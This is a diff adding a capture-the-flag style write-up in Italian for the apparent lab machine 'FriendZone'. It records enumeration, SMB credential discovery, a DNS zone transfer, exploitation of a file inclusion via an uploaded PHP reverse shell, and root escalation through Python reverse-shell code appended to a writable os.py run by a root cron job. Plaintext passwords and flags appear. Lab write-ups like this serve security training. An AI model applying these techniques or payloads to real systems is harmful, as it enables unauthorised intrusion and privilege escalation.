@@ -1,0 +1,652 @@
+10.10.10.123
+
+
+ nmap -vv -p- -T4 -n -Pn -oA fastscan 10.10.10.123
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 16:58 EDT
+Initiating Connect Scan at 16:58
+Scanning 10.10.10.123 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.123
+Discovered open port 443/tcp on 10.10.10.123
+Discovered open port 53/tcp on 10.10.10.123
+Discovered open port 22/tcp on 10.10.10.123
+Discovered open port 139/tcp on 10.10.10.123
+Discovered open port 445/tcp on 10.10.10.123
+Discovered open port 21/tcp on 10.10.10.123
+Completed Connect Scan at 16:58, 40.77s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.123
+Host is up, received user-set (0.065s latency).
+Scanned at 2022-03-21 16:58:12 EDT for 41s
+Not shown: 65528 closed tcp ports (conn-refused)
+PORT    STATE SERVICE      REASON
+21/tcp  open  ftp          syn-ack
+22/tcp  open  ssh          syn-ack
+53/tcp  open  domain       syn-ack
+80/tcp  open  http         syn-ack
+139/tcp open  netbios-ssn  syn-ack
+443/tcp open  https        syn-ack
+445/tcp open  microsoft-ds syn-ack
+
+
+sudo nmap -sC -sV -p 21,22,53,80,139,443,445 10.10.10.123
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 16:59 EDT
+Nmap scan report for 10.10.10.123
+Host is up (0.064s latency).
+
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Friend Zone Escape software
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp open  ssl/http    Apache httpd 2.4.29
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 404 Not Found
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: 0s
+| smb2-time: 
+|   date: 2022-03-21T21:00:04
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: friendzone
+|   NetBIOS computer name: FRIENDZONE\x00
+|   Domain name: \x00
+|   FQDN: friendzone
+|_  System time: 2022-03-21T23:00:03+02:00
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.36 seconds
+
+
+
+Port 80:
+
+Email us at: info@friendzoneportal.red
+
+friendzoneportal.red potrebbe essere un vhost?
+
+potrei controllare con dns su porta 53
+
+
+
+sudo gobuster  dir -u http://10.10.10.123/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x .php,.js,.txt,.htm,.html,.htmlx -k             
+[sudo] password for kali: 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.123/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,js,txt,htm,html,htmlx
+[+] Timeout:                 10s
+===============================================================
+2022/03/21 17:02:45 Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 296]
+/.htaccess.txt        (Status: 403) [Size: 300]
+/.htpasswd.htmlx      (Status: 403) [Size: 302]
+/.htaccess            (Status: 403) [Size: 296]
+/.htpasswd.php        (Status: 403) [Size: 300]
+/.htaccess.htm        (Status: 403) [Size: 300]
+/.htpasswd.js         (Status: 403) [Size: 299]
+/.htaccess.html       (Status: 403) [Size: 301]
+/.htpasswd.txt        (Status: 403) [Size: 300]
+/.htaccess.htmlx      (Status: 403) [Size: 302]
+/.htpasswd.htm        (Status: 403) [Size: 300]
+/.htaccess.php        (Status: 403) [Size: 300]
+/.htpasswd.html       (Status: 403) [Size: 301]
+/.htaccess.js         (Status: 403) [Size: 299]
+/index.html           (Status: 200) [Size: 324]
+/robots.txt           (Status: 200) [Size: 13] 
+/robots.txt           (Status: 200) [Size: 13] 
+/server-status        (Status: 403) [Size: 300]
+/wordpress            (Status: 301) [Size: 316] [--> http://10.10.10.123/wordpress/]
+
+
+
+
+
+
+Port 445:
+
+smbclient -L 10.10.10.123                                
+Enter WORKGROUP\kali's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	Files           Disk      FriendZone Samba Server Files /etc/Files
+	general         Disk      FriendZone Samba Server Files
+	Development     Disk      FriendZone Samba Server Files
+	IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            FRIENDZONE
+                                         
+
+
+
+smbmap -H 10.10.10.123   
+[+] Guest session   	IP: 10.10.10.123:445	Name: 10.10.10.123                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	Files                                             	NO ACCESS	FriendZone Samba Server Files /etc/Files
+	general                                           	READ ONLY	FriendZone Samba Server Files
+	Development                                       	READ, WRITE	FriendZone Samba Server Files
+	IPC$                                              	NO ACCESS	IPC Service (FriendZone server (Samba, Ubuntu))
+                     
+
+smbclient //10.10.10.123/general/                                                                                                 1 ⨯
+Enter WORKGROUP\kali's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls -lart
+NT_STATUS_NO_SUCH_FILE listing \-lart
+smb: \> ls
+  .                                   D        0  Wed Jan 16 15:10:51 2019
+  ..                                  D        0  Wed Jan 23 16:51:02 2019
+  creds.txt                           N       57  Tue Oct  9 19:52:42 2018
+
+		9221460 blocks of size 1024. 6443772 blocks available
+smb: \> type creds.txt
+type: command not found
+smb: \> get creds.txt
+
+
+
+ho ottenuto:
+
+
+creds for the admin THING:
+
+admin:WORKWORKHhallelujah@#
+
+
+
+posso caricare files sotto development:
+
+
+smbclient //10.10.10.123/development/
+Enter WORKGROUP\kali's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Mar 21 17:03:11 2022
+  ..                                  D        0  Wed Jan 23 16:51:02 2019
+
+		9221460 blocks of size 1024. 6443120 blocks available
+smb: \> put prova.txt 
+putting file prova.txt as \prova.txt (0.0 kb/s) (average 0.0 kb/s)
+smb: \> ls
+  .                                   D        0  Mon Mar 21 17:06:59 2022
+  ..                                  D        0  Wed Jan 23 16:51:02 2019
+  prova.txt                           A        6  Mon Mar 21 17:06:59 2022
+
+
+
+
+quesat directory non è raggiungibile da web server 
+
+
+
+e non trovo la admin "THING" nominata nel file creds.txt
+
+
+posso tornare alla idea iniziale e provare a trovare altri vhost con il server dns sulla prota 53
+
+
+
+dig axfr friendzoneportal.red +all @10.10.10.123
+
+
+dig axfr friendzoneportal.red +all @10.10.10.123
+
+; <<>> DiG 9.17.19-3-Debian <<>> axfr friendzoneportal.red +all @10.10.10.123
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 38509
+;; flags: qr aa; QUERY: 1, ANSWER: 9, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: 6ea37b6781bed2054deed8cd6238f71a1e5520a9d464ef9f (good)
+;; QUESTION SECTION:
+;friendzoneportal.red.		IN	AXFR
+
+;; ANSWER SECTION:
+friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzoneportal.red.	604800	IN	AAAA	::1
+friendzoneportal.red.	604800	IN	NS	localhost.
+friendzoneportal.red.	604800	IN	A	127.0.0.1
+admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
+files.friendzoneportal.red. 604800 IN	A	127.0.0.1
+imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
+vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
+friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+
+;; Query time: 52 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
+;; WHEN: Mon Mar 21 18:07:23 EDT 2022
+;; XFR size: 9 records (messages 1, bytes 309)
+
+
+
+
+
+dig axfr friendzone.red +all @10.10.10.123
+
+ dig axfr friendzone.red +all @10.10.10.123
+
+; <<>> DiG 9.17.19-3-Debian <<>> axfr friendzone.red +all @10.10.10.123
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27791
+;; flags: qr aa; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: 0b540e937619fc1c5fecb9046238f73503f48c4eb01fa3c1 (good)
+;; QUESTION SECTION:
+;friendzone.red.			IN	AXFR
+
+;; ANSWER SECTION:
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.		604800	IN	AAAA	::1
+friendzone.red.		604800	IN	NS	localhost.
+friendzone.red.		604800	IN	A	127.0.0.1
+administrator1.friendzone.red. 604800 IN A	127.0.0.1
+hr.friendzone.red.	604800	IN	A	127.0.0.1
+uploads.friendzone.red.	604800	IN	A	127.0.0.1
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+
+;; Query time: 56 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
+;; WHEN: Mon Mar 21 18:07:50 EDT 2022
+;; XFR size: 8 records (messages 1, bytes 289)
+
+
+
+
+
+
+ne aggiungo alcuni a /etc/hosts:
+
+
+
+10.10.10.123	friendzone.red
+10.10.10.123	admin.friendzoneportal.red
+10.10.10.123	files.friendzoneportal.red
+10.10.10.123	administrator1.friendzone.red
+10.10.10.123	uploads.friendzone.red
+10.10.10.123	hr.friendzone.red
+
+
+aprendoli semplicemente non sembrano esserci differenze rispetto a http://10.10.10.123/ normale
+
+tranne https://administrator1.friendzone.red/
+
+che mi da un form di login
+
+quindi provo con gobuster
+
+sudo gobuster  dir -u https://administrator1.friendzone.red/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x .php,.js,.txt,.htm,.html,.htmlx -k
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://administrator1.friendzone.red/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,js,txt,htm,html,htmlx
+[+] Timeout:                 10s
+===============================================================
+2022/03/21 18:16:13 Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd.html       (Status: 403) [Size: 319]
+/.htaccess.htmlx      (Status: 403) [Size: 320]
+/.htpasswd.htmlx      (Status: 403) [Size: 320]
+/.htaccess.php        (Status: 403) [Size: 318]
+/.htpasswd            (Status: 403) [Size: 314]
+/.htaccess.js         (Status: 403) [Size: 317]
+/.htpasswd.php        (Status: 403) [Size: 318]
+/.htaccess.txt        (Status: 403) [Size: 318]
+/.htpasswd.js         (Status: 403) [Size: 317]
+/.htaccess.htm        (Status: 403) [Size: 318]
+/.htpasswd.txt        (Status: 403) [Size: 318]
+/.htaccess            (Status: 403) [Size: 314]
+/.htpasswd.htm        (Status: 403) [Size: 318]
+/.htaccess.html       (Status: 403) [Size: 319]
+/dashboard.php        (Status: 200) [Size: 101]
+/images               (Status: 301) [Size: 349] [--> https://administrator1.friendzone.red/images/]
+/index.html           (Status: 200) [Size: 2873]                                                   
+/login.php            (Status: 200) [Size: 7]                                                      
+/server-status        (Status: 403) [Size: 318]                                                    
+                                                                                                   
+===============================================================
+2022/03/21 18:17:46 Finished
+===============================================================
+
+
+intanto faccio il login a:
+
+
+https://administrator1.friendzone.red/
+
+con le credenziali che ho trovato in smb:
+
+admin:WORKWORKHhallelujah@#
+
+Login Done ! visit /dashboard.php
+
+
+https://administrator1.friendzone.red/dashboard.php
+
+image_name param is missed !
+
+please enter it to show the image
+
+default is image_id=a.jpg&pagename=timestamp
+
+
+da quello che vedo include timestamp.php nella pagina e l'immagine a.jpg
+
+
+forse posso usare a mio favore se c'è una LFI/RFI
+
+funziona perchè mettendo:
+
+
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=login
+
+in effetti mi stampa "Wrong!" che è quello che mi stampa login.php se vado direttamente su:
+
+https://administrator1.friendzone.red/login.php
+
+
+
+gia prima ho visto che posso caricare files sotto SMB development 
+
+se ci carico una shell php poi posso eseguirla, se capisco qual è il path
+
+
+considerando il commento:
+
+Files                                             	NO ACCESS	FriendZone Samba Server Files /etc/Files
+
+posso ipotizzare che Development sia sotto /etc/Development
+
+quindi carico una shell php:
+
+
+
+smbclient //10.10.10.123/development/                                                                  130 ⨯
+Enter WORKGROUP\kali's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Mar 21 17:15:55 2022
+  ..                                  D        0  Wed Jan 23 16:51:02 2019
+  prova.txt                           A        6  Mon Mar 21 17:06:59 2022
+
+		9221460 blocks of size 1024. 6376164 blocks available
+smb: \> put php_rev_shell.php
+putting file php_rev_shell.php as \php_rev_shell.php (30.3 kb/s) (average 30.3 kb/s)
+smb: \> ls
+  .                                   D        0  Mon Mar 21 18:34:39 2022
+  ..                                  D        0  Wed Jan 23 16:51:02 2019
+  php_rev_shell.php                   A     5492  Mon Mar 21 18:34:39 2022
+  prova.txt                           A        6  Mon Mar 21 17:06:59 2022
+
+		9221460 blocks of size 1024. 6376156 blocks available
+smb: \> 
+
+
+andando poi:
+
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php_rev_shell
+
+
+//è importante non mettere .php alla fine perchè probabilemnte lo aggiunge già lo script 
+
+
+
+
+ottengo reverse shell:
+
+nc -lvnp 443                                    
+listening on [any] 443 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.123] 36138
+Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 00:35:55 up  1:50,  0 users,  load average: 0.00, 0.01, 0.08
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+
+
+
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
+friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+Debian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin
+ftp:x:108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+bind:x:109:116::/var/cache/bind:/usr/sbin/nologin
+
+
+
+
+$ ls -lart /home/
+total 12
+drwxr-xr-x 22 root   root   4096 Oct  5  2018 ..
+drwxr-xr-x  3 root   root   4096 Oct  5  2018 .
+drwxr-xr-x  5 friend friend 4096 Jan 24  2019 friend
+$ ls -lart /home/friend/
+total 36
+drwxr-xr-x 3 root   root   4096 Oct  5  2018 ..
+-rw-r--r-- 1 friend friend  807 Oct  5  2018 .profile
+-rw-r--r-- 1 friend friend 3771 Oct  5  2018 .bashrc
+-rw-r--r-- 1 friend friend  220 Oct  5  2018 .bash_logout
+drwx------ 2 friend friend 4096 Oct  5  2018 .cache
+-rw-r--r-- 1 friend friend    0 Oct  5  2018 .sudo_as_admin_successful
+drwx------ 3 friend friend 4096 Oct  6  2018 .gnupg
+drwxrwxr-x 3 friend friend 4096 Oct  6  2018 .local
+-r--r--r-- 1 root   root     33 Oct  6  2018 user.txt
+lrwxrwxrwx 1 root   root      9 Jan 24  2019 .bash_history -> /dev/null
+drwxr-xr-x 5 friend friend 4096 Jan 24  2019 .
+$ cat /home/friend/user.txt
+a9ed20acecd6c5b6b52f474e15ae9a11
+
+
+
+
+
+cd /var/www/
+$ ls -lart
+ls -lart
+total 36
+drwxr-xr-x  3 root root 4096 Oct  6  2018 uploads
+drwxr-xr-x  4 root root 4096 Oct  6  2018 friendzone
+drwxr-xr-x  2 root root 4096 Oct  6  2018 friendzoneportal
+drwxr-xr-x  3 root root 4096 Oct  6  2018 html
+drwxr-xr-x 12 root root 4096 Oct  6  2018 ..
+-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf
+drwxr-xr-x  8 root root 4096 Oct  6  2018 .
+drwxr-xr-x  2 root root 4096 Jan 15  2019 friendzoneportaladmin
+drwxr-xr-x  3 root root 4096 Jan 16  2019 admin
+$ cat mysql_data.conf
+cat mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+$ 
+
+
+con queste credenziali posso semplicemente fare ssh friend@10.10.10.123
+
+
+friend@FriendZone:~$ id
+uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+friend@FriendZone:~$ 
+
+
+-rwxr--r-- 1 root root  424 Jan 16  2019 reporter.py
+
+
+sotto /opt/server_admin c'è lo script python
+
+
+friend@FriendZone:/opt/server_admin$ cat reporter.py
+#!/usr/bin/python
+
+import os
+
+to_address = "admin1@friendzone.com"
+from_address = "admin2@friendzone.com"
+
+print "[+] Trying to send email to %s"%to_address
+
+#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+
+
+
+
+non posso modificarlo quindi non eseguirà nulla se lo eseguo
+
+e anche eseguendolo visto che non ho il suid sul binario di python non lo eseguo come root
+
+
+con cat /etc/crontab non ottengo nulla quindi uso pspy e vedo:
+
+
+
+2022/03/22 01:01:46 CMD: UID=0    PID=1      | /sbin/init splash 
+2022/03/22 01:02:01 CMD: UID=0    PID=2348   | /usr/bin/python /opt/server_admin/reporter.py 
+2022/03/22 01:02:01 CMD: UID=0    PID=2347   | /bin/sh -c /opt/server_admin/reporter.py 
+2022/03/22 01:02:01 CMD: UID=0    PID=2346   | /usr/sbin/CRON -f 
+2022/03/22 01:04:01 CMD: UID=0    PID=2352   | /usr/bin/python /opt/server_admin/reporter.py 
+2022/03/22 01:04:01 CMD: UID=0    PID=2351   | /bin/sh -c /opt/server_admin/reporter.py 
+2022/03/22 01:04:01 CMD: UID=0    PID=2350   | /usr/sbin/CRON -f 
+
+
+
+viene eseguito da root (uid=0) ogni due minuti circa
+
+
+ora devo solo exploitarlo
+
+il programma fa
+
+import os 
+
+(anche se poi non la usa)
+
+e già prima da una ricerca dei file scrivibili da friend avevo trovato:
+
+
+/usr/lib/python2.7/os.pyc
+/usr/lib/python2.7/os.py
+
+
+quindi devo sostituire os con una mia versione oppure cerco semplicemente di modificare os.py aggiungendo mio codice alla fine:
+(ci sono riuscito con nano, con vi avevoi problemi)
+
+
+
+import socket,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.27",4242))
+dup2(s.fileno(),0)
+dup2(s.fileno(),1)
+dup2(s.fileno(),2);pty.spawn("/bin/sh")
+
+
+
+ottengo una reverse shell dopo massimo due minuti:
+
+
+nc -lvnp 4242
+listening on [any] 4242 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.123] 35608
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+cat /root/root.txt
+b0e6c60b82cf96e9855ac1656a9e90c7
+
+
+
+
